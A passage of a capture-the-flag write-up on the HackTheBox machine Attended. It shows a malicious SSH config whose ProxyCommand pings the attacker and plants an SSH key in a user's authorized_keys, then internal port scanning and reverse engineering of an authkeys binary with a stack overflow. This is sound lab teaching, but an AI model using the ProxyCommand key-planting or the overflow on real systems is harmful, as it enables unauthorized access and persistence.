An SSH config file defines a given SSH connection. For example, if you regularly had to connect to a given host on a nonstandard port and with a SSH key that isn’t in your `.ssh` directory, you could specify those in a config file and then invoke that to avoid having to type all that out each time you wanted to connect.

The [BSD man page](https://www.freebsd.org/cgi/man.cgi?ssh_config(5)) or `ssh_config` shows the various options that can be included, and there’s one that’s really interesting - `ProxyCommand`:

> ```

> Specifies the command to use to connect to	the server.  The com-
> mand string extends to the	end of the line, and is	executed using
> the user's	shell `exec' directive to avoid	a lingering shell
> process.
>
> Arguments to ProxyCommand accept the tokens described in the
> TOKENS section.  The command can be basically anything, and
> should read from its standard input and write to its standard
> output.  It should	eventually connect an sshd(8) server running
> on	some machine, or execute sshd -i somewhere.  Host key manage-
> ment will be done using the HostName of the host being connected
> (defaulting to the	name typed by the user).  Setting the command
> to	none disables this option entirely.  Note that CheckHostIP is
> not available for connects	with a proxy command.
>
> This directive is useful in conjunction with nc(1)	and its	proxy
> support.  For example, the	following directive would connect via
> an	HTTP proxy at 192.0.2.0:
>
> 		ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
>
> ```

It’s going to run a command before connecting. That’s something I can abuse.

#### POC

To test this, I’ll create a simple config file with a `ProxyCommand` to `ping` my host:

```

Host *
ProxyCommand ping -c 1 10.10.14.14

```

I used `Host *` because the man page under the `Host` keyword says “A single `*` as a pattern can be used to provide global defaults for all hosts”. I need to drop this into the `/home/shared` directory. Luckily, I already have a script do to that:

```

oxdf@parrot$ python upload.py attachments/ping-ssh.config /home/shared/ping-ssh.config
[+] Email sent at 2021-05-02 15:41:52.170558
[+] Waiting for HTTP request
10.10.10.221 - - [02/May/2021 15:42:48] "GET /attachments/ping-ssh.config HTTP/1.1" 200 -

```

About a minute after the upload, ICMP packets arrive at my VM:

```

oxdf@parrot$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:43:40.477880 IP 10.10.10.221 > 10.10.14.14: ICMP echo request, id 43926, seq 0, length 64
15:43:40.477907 IP 10.10.14.14 > 10.10.10.221: ICMP echo reply, id 43926, seq 0, length 64

```

#### SSH Key

It wouldn’t be too difficult to build out a freshness shell based on the parts I already have. I would start with the `cmdrunner-server` script I already have, and update it to write the command I want run into a template SSH config file, and then use the `vim` exploit to write that file into `/home/shared`. If I had the command run through `/tmp/cmdrunner.py` on Attended, I could even use the same server to receive the results.

I didn’t have to go that way because I first checked to see if I could write a SSH key into `/home/freshness/.ssh/authorized_keys` with the following config file:

```

Host *
ProxyCommand echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /home/freshness/.ssh/authorized_keys

```

I’ll upload it just like before:

```

oxdf@parrot$ python upload.py attachments/key-ssh.config /home/shared/key-ssh.config
[+] Email sent at 2021-05-02 16:02:18.357110
[+] Waiting for HTTP request
10.10.10.221 - - [02/May/2021 16:02:48] "GET /attachments/key-ssh.config HTTP/1.1" 200 -

```

Once I see the request, I’ll sleep for 60 seconds (to allow for the second cron to pick up and run the config file), and then connect with SSH. It works:

```

oxdf@parrot$ sleep 60; ssh -i ~/keys/ed25519_gen freshness@10.10.10.221
Last login: Sun May  2 22:08:40 2021 from 10.10.14.14
OpenBSD 6.5 (GENERIC) #13: Sun May 10 23:16:59 MDT 2020

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

attended$

```

And I can grab `user.txt`:

```

attended$ cat user.txt
b0390ad5************************

```

## Shell as root

### Enumeration

#### FileSystem

In freshness’ homedir there’s a couple files besides `user.txt`, and a directory:

```

attended$ ls -la
total 52
drwxr-x---  4 freshness  freshness  512 Nov 12 16:56 .
drwxr-xr-x  5 root       wheel      512 Jun 26  2019 ..
-rw-r--r--  1 freshness  freshness   87 Jun 26  2019 .Xdefaults
-rw-r--r--  1 freshness  freshness  771 Jun 26  2019 .cshrc
-rw-r--r--  1 freshness  freshness  101 Jun 26  2019 .cvsrc
-rw-r--r--  1 freshness  freshness  359 Jun 26  2019 .login
-rw-r--r--  1 freshness  freshness  175 Jun 26  2019 .mailrc
-rw-r--r--  1 freshness  freshness  215 Jun 26  2019 .profile
drwx------  2 freshness  freshness  512 Aug  6  2019 .ssh
drwxr-x---  2 freshness  freshness  512 Nov 16 13:57 authkeys
-rw-r--r--  1 freshness  freshness  436 May  2 22:06 dead.letter
-rwxr-x---  1 root       freshness  422 Jun 28  2019 fchecker.py
-r--r-----  1 root       freshness   33 Jun 26  2019 user.txt

```

The `dead.letter` file is a relic of the cron process:

```

Date: Sun, 2 May 2021 22:06:32 +0200 (CEST)
From: root (Cron Daemon)
To: freshness
Subject: Cron <freshness@attended> /home/freshness/fchecker.py
Auto-Submitted: auto-generated
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/home/freshness>
X-Cron-Env: <LOGNAME=freshness>
X-Cron-Env: <USER=freshness>

Pseudo-terminal will not be allocated because stdin is not a terminal.
kex_exchange_identification: Connection closed by remote host

```

`fchecker.py` is the script that is automating the SSH config running (more in [Beyond Root](#beyond-root)).

The `authkeys` dir contains a binary and a text file:

```

attended$ ls -la
total 24
drwxr-x---  2 freshness  freshness   512 Nov 16 13:57 .
drwxr-x---  4 freshness  freshness   512 May  3 02:56 ..
-rw-r--r--  1 root       wheel      5424 Nov 16 13:35 authkeys
-rw-r-----  1 root       freshness   178 Nov  6  2019 note.txt
attended$ file authkeys
authkeys: ELF 64-bit LSB executable, x86-64, version 1
attended$ cat note.txt
on attended:
[ ] enable authkeys command for sshd
[x] remove source code
[ ] use nobody
on attendedgw:
[x] enable authkeys command for sshd
[x] remove source code
[ ] use nobody

```

I am running on Attended, but there’s also another “machine” here, the gateway. In fact, I suspect Attended is some kind of container or jail on AttendedGW, as the current IP in this shell is 192.168.23.2.

#### SSH Background

At this point, it’s worth a quick diversion into some background on how SSH authentication works. When I type `ssh root@10.1.1.200`, the client will generate a list of private keys that it might try to use for auth. That could be keys in `~/.ssh`, or any given with `-i` in the command line.

From each private key, it will identify the associated public key (by looking for the matching `.pub` file, or if it can’t find the `.pub` file, and the private key is of a newer format, extracting the public key embedded in it), and send each of those public keys to the server.

The server will look at each public key and make a decision as to if that user would be allowed to connect. The most common way to do that would be to see if that public key is in the `authorized_keys` file, but it could also use a command to get public keys from another server, or really do whatever it wants. At this point, the server doesn’t know that the client has the matching private key, it’s just checking to see if the public key is one it would accept. If it finds one, it sends back to the client that it would accept that key.

The client now sends a signature to the server which is cryptographically generated using the private key, and can be verified by the public key.

The server can validate that signature with the public key, and know it knows that the client has the matching private key, and allows the user in. The private key is never transmitted from the client system.

Interestingly, if you try to send a public key to a server with `-i`, it will go through the first steps, but then the client fails when it’s asked to send a signature and it doesn’t have the private key to do so.

#### AuthKeys

I don’t yet know exactly what implementation of AuthKeys is being used here, but in general, the term applies to a configuration where SSH keys are stored at a central server such that when a user tries to SSH to a host, rather than checking the private key against public keys in a local `authorized_keys` file, it runs a specified command to get the public key from a server.

I first blogged about the SSH `AuthorizedKeysCommand` in [Ypuffy](/2019/02/09/htb-ypuffy.html), and again later in [Travel](/2020/09/12/htb-travel.html). I pulled the `sshd_config` from an OpenBSD VM and from Attended, and there are two lines different:

```

oxdf@parrot$ diff attended_sshd_config default_sshd_config 
94,95d93
< #AuthorizedKeysCommand /usr/local/sbin/authkeys %f %h %t %k
< #AuthorizedKeysCommandUser root

```

Assuming that the config on the GW is the same (and uncommented because the `note.txt` said it was enabled), then whenever someone connects with SSH to the gateway, this command will be run. Based on the [man pages](https://man.openbsd.org/sshd_config.5#TOKENS):
- `%f` - The fingerprint of the key or certificate.
- `%h` - The home directory of the user.
- `%t` - The key or certificate type.
- `%k` - The base64-encoded key or certificate for authentication.

#### Enumerate Gateway

A quick ping sweep of the local network shows only two boxes, .1 and .2:

```

attended$ for i in `jot - 0 255`; do (ping -c 1 192.168.23.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 192.168.23.2: icmp_seq=0 ttl=255 time=1.072 ms
64 bytes from 192.168.23.1: icmp_seq=0 ttl=255 time=2.900 ms

```

Given that Attended is .2, AttendedGW must be .1. This is confirmed looking at the `/etc/hosts` file:

```

attended$ cat /etc/hosts
127.0.0.1       localhost
::1             localhost
192.168.23.2    attended.attended.htb attended
192.168.23.1    attendedgw.attended.htb attendedgw

```

`ping` by hostname works as well:

```

attended$ ping attendedgw
PING attendedgw.attended.htb (192.168.23.1): 56 data bytes
64 bytes from 192.168.23.1: icmp_seq=0 ttl=255 time=0.167 ms
64 bytes from 192.168.23.1: icmp_seq=1 ttl=255 time=0.104 ms
^C

```

I can look for open ports on the box with `nc`:

```

attended$ nc -zv -w 1 192.168.23.1 1-9999 2>&1 | grep -v -e refused -e failed
Connection to 192.168.23.1 25 port [tcp/smtp] succeeded!
Connection to 192.168.23.1 53 port [tcp/domain] succeeded!
Connection to 192.168.23.1 80 port [tcp/www] succeeded!
Connection to 192.168.23.1 2222 port [tcp/*] succeeded!
Connection to 192.168.23.1 8080 port [tcp/*] succeeded!

```

There’s a handful of interesting ports here, but as my focus is on SSH, 2222 is the most interesting to start. I can confirm it’s SSH:

```

attended$ nc -v 192.168.23.1 2222
Connection to 192.168.23.1 2222 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_8.0

```

### Arguments

#### Running It

I could see from the config file it takes four arguments. Trying to run this binary on Attended won’t work:

```

attended$ ./authkeys
ksh: ./authkeys: cannot execute - Permission denied

```

It’s set to read, not execute. I’ll copy the file back to my host. It’s a 64-bit ELF:

```

oxdf@parrot$ scp -i ~/keys/ed25519_gen freshness@10.10.10.221:~/authkeys/authkeys .
authkeys                  100% 5424    58.6KB/s   00:00 
oxdf@parrot$ file authkeys 
authkeys: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for OpenBSD, stripped

```

I’ll create an OpenBSD VM to test in, because while this binary will run in a Linux VM, I don’t like doing pwn with that big a difference. I’ll [grab an ISO](https://www.openbsd.org/faq/faq4.html#Download) and build one (it’s pretty quick). This VM hostname is obsd.

Running it without args (or any number of args except four) returns an error:

```

obsd# ./authkeys
Too bad, Wrong number of arguments!

```

Running it with four args still basically just exits with a message that it’s incomplete:

```

obsd# ./authkeys a a a a   
Evaluating key...
Sorry, this damn thing is not complete yet. I'll finish asap, promise!

```

It doesn’t really make sense that this incomplete binary is also deployed and enabled on the gateway, but it’s the only lead I have at this point.

#### Understand Arguments

Above I was able to read the four args passed to `authkeys` from the man pages, but I wanted to really see it in action. In my OpenBSD vm, I set a `AuthorizedKeysCommand` and restart the service:

```

obsd# tail -2 /etc/ssh/sshd_config 
AuthorizedKeysCommand /root/test.sh %f %h %t %k
AuthorizedKeysCommandUser root
obsd# /etc/rc.d/sshd restart       
sshd(ok)
sshd(ok)

```

This script just writes the args to a file:

```

#!/bin/sh

echo "%f: $1" > /root/output
echo "%h: $2" >> /root/output
echo "%t: $3" >> /root/output
echo "%k: $4" >> /root/output
echo >> /root/output

```

I’ll generate a key I don’t mind publishing in a blog post:

```

oxdf@parrot$ ssh-keygen -f test_key                                                                  
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in test_key
Your public key has been saved in test_key.pub
The key fingerprint is:
SHA256:I7MlvNAzzah+wjIl8Fvk14+3opnJxR1O9nzRFzLSOT8 oxdf@parrot
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|            . .  |
|           . * . |
|.   .o +    . =..|
| o o. X.S +   .Eo|
|  o +o.@.* +   .o|
|   *..o ooo o .  |
|  +.o..=o o  .   |
|   o.o*. o..     |
+----[SHA256]-----+
oxdf@parrot$ cat test_key.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDwzX0t9JABZzSNsHfWyAdqISzffgbStl6RDYFNCGPKMOtT8k08ZHsI7PUIpkGmNN+UhwNIn+NhewuDf8cWT7mc1uOPQkZYKH2EANmT7mA+ujw0NieTLIdPQ5vPeMIFUBslm83Uai3D67ZavqF9o/77akCnLHi0yCx/Ni85lSk7v7G4XI/J3d2RmueYnD8me9PEPUPoBUaUWp9IPjbb5fy4qegmyn7Ecyx2KJ44IAzPogQoSuGLhb2gnSFFjHxTdFKOv6VhcdYfJoJL4dFU6RSSQvnKBlZjjUOlKviXwJt2ozDhkNSrbcUv2fqW3z/LOhpc3ehdU2j6B76TPbVKkftyrtO67L5KfeaiXT8KvDEDnkmLKJEV54aweMyZrHzow6reH/EwGYV2+u7c+/MdxQuWU9qC07d3AfuWTVki4ow7+XOfDGkGf+F+BmJ53CkevOyRgI+KG+NTL048+GL6SITCACTGtHqhrEq8/jRijYSvVs3NuLoVKmG6GqebHGUti8M= oxdf@parrot
oxdf@parrot$ ssh-keygen -lf test_key.pub 
3072 SHA256:I7MlvNAzzah+wjIl8Fvk14+3opnJxR1O9nzRFzLSOT8 oxdf@parrot (RSA)

```

And SSH to the VM:

```

oxdf@parrot$ ssh -i test_key root@10.1.1.200
root@10.1.1.200's password:

```

It doesn’t work, and asks for a password, which is expected. I can CTRL-c to kill that. Checking the VM, `output` exists:

```

obsd# cat output
%f: SHA256:I7MlvNAzzah+wjIl8Fvk14+3opnJxR1O9nzRFzLSOT8
%h: /root
%t: ssh-rsa
%k: AAAAB3NzaC1yc2EAAAADAQABAAABgQDwzX0t9JABZzSNsHfWyAdqISzffgbStl6RDYFNCGPKMOtT8k08ZHsI7PUIpkGmNN+UhwNIn+NhewuDf8cWT7mc1uOPQkZYKH2EANmT7mA+ujw0NieTLIdPQ5vPeMIFUBslm83Uai3D67ZavqF9o/77akCnLHi0yCx/Ni85lSk7v7G4XI/J3d2RmueYnD8me9PEPUPoBUaUWp9IPjbb5fy4qegmyn7Ecyx2KJ44IAzPogQoSuGLhb2gnSFFjHxTdFKOv6VhcdYfJoJL4dFU6RSSQvnKBlZjjUOlKviXwJt2ozDhkNSrbcUv2fqW3z/LOhpc3ehdU2j6B76TPbVKkftyrtO67L5KfeaiXT8KvDEDnkmLKJEV54aweMyZrHzow6reH/EwGYV2+u7c+/MdxQuWU9qC07d3AfuWTVki4ow7+XOfDGkGf+F+BmJ53CkevOyRgI+KG+NTL048+GL6SITCACTGtHqhrEq8/jRijYSvVs3NuLoVKmG6GqebHGUti8M=

```

The `%k` value is my public key, and `%f` is the fingerprint.

### Reverse Engineering

#### main

In general, my preference for reverse engineering is [Ghidra](https://ghidra-sre.org/) decompliation, then [IDA Pro](https://www.hex-rays.com/products/ida/support/download_freeware/) disassembly, then Ghidra disassembly. Ghidra decompliation is really poor with BSD binaries, and after confirming that, I went to IDA. Luckily, there binary is quite small.

It starts with a branch based on the number of args:

[![image-20210503144453744](https://0xdfimages.gitlab.io/img/image-20210503144453744.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210503144453744.png)

The right side (args not equal to five) prints the too bad message, and then exits. It doesn’t really show well in the IDA graph, but after `mov eax, 1` and `xor rdi, rdi`, it calls `syscall`, and syscall 1 is exit.

Assuming there are exactly 5 in `argv` (four args plus the program name), it prints the “Evaluating key” message (`syscall` with rax of 4 is `write`).

Then it starts at what IDA labels as `[rbp + arg_0]` (where `arg_0` is 8). This is the first of the five argument strings, and a pointer to it is stored in rsi. It sets rbx and rcx to 0, then sets the low byte to five. Next it enters a double loop:

![image-20210503153435560](https://0xdfimages.gitlab.io/img/image-20210503153435560.png)

The top square decrements rcx, and then checks if it’s 0, and exits the loops if so. On entering, it’s five, so it decrements to four and goes into the next loop. rsi has the start of the first arg, and rbx is a counter starting at zero. It loads the byte at rsi+rbx, increments rbx, and checks if the byte loaded is zero (the end of the string). If so, it loops back to the first block. For non-zero, it goes to the top of this block. So at the end of the inner loop, it’s found the rsi + rbx point to the first byte after the end of the string. It does this four times.

The inner loop is moving rbx through a string until it finds a null. The outer loop is doing that four times. This has the effect (assuming the five arg strings are stored back to back in memory) of moving rsi + rbx to point to the start of the last argument.

Because I had the four args from above, I can start `gdb authkeys` and then pass them into the `run` command:

```

(gdb) run SHA256:I7MlvNAzzah+wjIl8Fvk14+3opnJxR1O9nzRFzLSOT8 /root ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDwzX0t9JABZzSNsHfWyAdqISzffgbStl6RDYFNCGPKMOtT8k08ZHsI7PUIpkGmNN+UhwNIn+NhewuDf8cWT7mc1uOPQkZYKH2EANmT7mA+ujw0NieTLIdPQ5vPeMIFUBslm83Uai3D67ZavqF9o/77akCnLHi0yCx/Ni85lSk7v7G4XI/J3d2RmueYnD8me9PEPUPoBUaUWp9IPjbb5fy4qegmyn7Ecyx2KJ44IAzPogQoSuGLhb2gnSFFjHxTdFKOv6VhcdYfJoJL4dFU6RSSQvnKBlZjjUOlKviXwJt2ozDhkNSrbcUv2fqW3z/LOhpc3ehdU2j6B76TPbVKkftyrtO67L5KfeaiXT8KvDEDnkmLKJEV54aweMyZrHzow6reH/EwGYV2+u7c+/MdxQuWU9qC07d3AfuWTVki4ow7+XOfDGkGf+F+BmJ53CkevOyRgI+KG+NTL048+GL6SITCACTGtHqhrEq8/jRijYSvVs3NuLoVKmG6GqebHGUti8M=

```

With a breakpoint at the start of the loop, see the strings in memory. This loop assumes that the five strings are stored in memory one after another, which they are:

```

(gdb) x/s 0x00007f7ffffe90f0
0x7f7ffffe90f0:  "/root/authkeys"
(gdb) x/s 0x00007f7ffffe90ff
0x7f7ffffe90ff:  "SHA256:I7MlvNAzzah+wjIl8Fvk14+3opnJxR1O9nzRFzLSOT8"
(gdb) x/s 0x00007f7ffffe9132
0x7f7ffffe9132:  "/root"
(gdb) x/s 0x00007f7ffffe9138
0x7f7ffffe9138:  "ssh-rsa"
(gdb) x/s 0x00007f7ffffe9140
0x7f7ffffe9140:  "AAAAB3NzaC1yc2EAAAADAQABAAABgQDwzX0t9JABZzSNsHfWyAdqISzffgbStl6RDYFNCGPKMOtT8k08ZHsI7PUIpkGmNN+UhwNIn+NhewuDf8cWT7mc1uOPQkZYKH2EANmT7mA+ujw0NieTLIdPQ5vPeMIFUBslm83Uai3D67ZavqF9o/77akCnLHi0yCx/Ni85lSk7"...

```

An easier way to do this would have been to look at rbp+8, which has pointers to each of these strings:

```

(gdb) x/5xg $rbp+8
0x7f7ffffe8f98: 0x00007f7ffffe90f0      0x00007f7ffffe90ff  <-- /root/authkeys, fingerprint
0x7f7ffffe8fa8: 0x00007f7ffffe9132      0x00007f7ffffe9138  <-- homedir, key type
0x7f7ffffe8fb8: 0x00007f7ffffe9140                          <-- pubkey

```

From here, it calls a function (`sub_4002c4`), and then prints the message and exits:

![image-20210503154246413](https://0xdfimages.gitlab.io/img/image-20210503154246413.png)

#### decode key (sub\_4002c4)

The function is mostly one big loop:

[![image-20210503160259339](https://0xdfimages.gitlab.io/img/image-20210503160259339.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210503160259339.png)

This loop starts with a string that is a base64 alphabet:

![image-20210503160206386](https://0xdfimages.gitlab.io/img/image-20210503160206386.png)

It’s looping over each character, and using this, I can tell pretty quickly that it’s a base64 decode function.

At the start of the function, it sets r8 to the start of the key string, and that is the pointer that is used to read a byte, and then is incremented.

The issue with the binary is that it only creates 0x300 (768) bytes of space on the stack to hold the decoded bytes. Because of how base64 inflates data, that means I’ll it can only hold keys up to 1024 bytes (base64 encoded).

The RSA key I generated with the default key length decodes to 407 bytes, so that’s fine. But passing in a longer string will crash the program:

```

obsd# ./authkeys a b c `python3 -c 'print("A"*1040)'` 
Evaluating key...
Segmentation fault (core dumped) 

```

### SSH Key Understanding

#### Large Key

The default key size for an RSA SSH key is 2048 bytes, but I can specify more using `-b`. I’ll make one that’s 16k instead of 2k:

```

oxdf@parrot$ ssh-keygen -f test_key-16k -b 16384
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in test_key-16k
Your public key has been saved in test_key-16k.pub
The key fingerprint is:
SHA256:5g1O9bSxNmhtXXzBlydICP+o6QTkttPZiFbCT6fDJuo oxdf@parrot
The key's randomart image is:
+---[RSA 16384]---+
|        .. o.....|
|         .. . .++|
|      .   o o  .*|
|     +   . B = ..|
|      * S = X .  |
|     . / % o .   |
|      * / o      |
|     o * .       |
|   .E   .        |
+----[SHA256]-----+

```

When I SSH to the OpenBSD VM, `output` gets the new values, and `%k` is much longer:

```

obsd# cat output
%f: SHA256:5g1O9bSxNmhtXXzBlydICP+o6QTkttPZiFbCT6fDJuo
%h: /root
%t: ssh-rsa
%k: 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

```

That public key is 2764 bytes, which decodes to 2071 bytes, plenty to overflow `authkeys`.

#### Private Key Structure

I need to give `ssh` a valid key, or the `ssh` client won’t even try to connect. I spent some time looking at the binary structure of SSH keys, specially the OpenSSH key formats. The new formats of RSA SSH private keys actually have the public key embedded in it. I started off thinking about trying to change the public key from within the private key (before realizing that I could just trigger the vuln with `ssh -i public_key`, see the [SSH Background section](#ssh-background) above). Still, it’s interesting to see the structure.

The private key is stored in the following structure:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAIFwAAAAdzc2gtcn
...[snip]...
BM/1bcJBUTVlCtGKmA4vpBVSys+XK1l6dWKBjo93pE9ioHATdqHF8axxUAAAALb3hkZkBw
YXJyb3Q=
-----END OPENSSH PRIVATE KEY-----

```

I’ll look at the key decoded as a hexdump with `cat test_key-16k | grep -v 'PRIVATE' | base64 -d | xxd | less`.

The documentation on this format is proprietary, but [this site](https://coolaj86.com/articles/the-openssh-private-key-format/) gives a good break down. My key starts like:

```

00000000: 6f70 656e 7373 682d 6b65 792d 7631 0000  openssh-key-v1..
00000010: 0000 046e 6f6e 6500 0000 046e 6f6e 6500  ...none....none.
00000020: 0000 0000 0000 0100 0008 1700 0000 0773  ...............s
00000030: 7368 2d72 7361 0000 0003 0100 0100 0008  sh-rsa..........
00000040: 0100 ccb2 bf94 dd4d e952 f556 ec4a d9a3  .......M.R.V.J..
...[snip]...

```

That breaks down to:

| Offset | Field | Size | Value |
| --- | --- | --- | --- |
| 0 | Auth Magic | 15 | `openssh-key-v1\x00` |
| 0x0f | Cipher Name Len | 4 | 4 |
| 0x13 | Cipher Name Str | variable | `none` |
| 0x17 | kdf Name Len | 4 | 4 |
| 0x1b | kdf Name Str | variable | `none` |
| 0x1f | kdf len | 4 | 0 |
| 0x23 | Num Keys | 4 | 1 |
| 0x27 | Pub Key Len | 4 | 0x817 == 2071 |
| 0x2b | Public key | 2071 | … |

There are more fields that come after the public key, but that’s enough for here for now.

#### Public Key Structure

Public keys are typically stored in the format:

```

[key type] [key base64] [user]

```

I’ll use the following to look at the decoded data in the key:

```

cat test_key-16k.pub | cut -d' ' -f2 | base64 -d | xxd | less

```

It starts out:

```

00000000: 0000 0007 7373 682d 7273 6100 0000 0301  ....ssh-rsa.....
00000010: 0001 0000 0801 00cc b2bf 94dd 4de9 52f5  ............M.R.
00000020: 56ec 4ad9 a3bd b337 7287 fbc6 c543 10be  V.J....7r....C..
00000030: 6239 18dc b292 530a 9846 c90d c751 07e2  b9....S..F...Q..
00000040: 9302 1d52 584a 459c 79b4 c7f4 add6 b537  ...RXJE.y......7
00000050: cfef 332b b94c e047 7dca 6da9 3bfa 9614  ..3+.L.G}.m.;...
00000060: 0c28 a287 101e 9441 6b80 d6a1 10b6 3b48  .(.....Ak.....;H
00000070: 0e71 8b2a 7207 61cb 26d8 3d83 8d7f 68bc  .q.*r.a.&.=...h.
00000080: bf96 823b 2dec b8a7 1480 965e d335 da64  ...;-......^.5.d
00000090: 2ca0 a29a 51f4 832d 85bb e9c0 31a1 e1c6  ,...Q..-....1...
...[snip]...

```

I’ll notice that matches what I saw in the private key exactly.

[RFC4253](https://tools.ietf.org/html/rfc4253#section-6.6) defines the different key types, where an `ssh-rsa` is of the structure:

```

      string    "ssh-rsa"
      mpint     e
      mpint     n

```

The data type `mpint` is defined in [RFC4251](https://tools.ietf.org/html/rfc4251#section-5), and it’s got a four byte size, followed by an integer with the most significant byte first. So for the key above, the red is the `ssh-rsa` size and string, the blue is `e` size and value, and the orange is the `n` size and value:

![image-20210504170449630](https://0xdfimages.gitlab.io/img/image-20210504170449630.png)

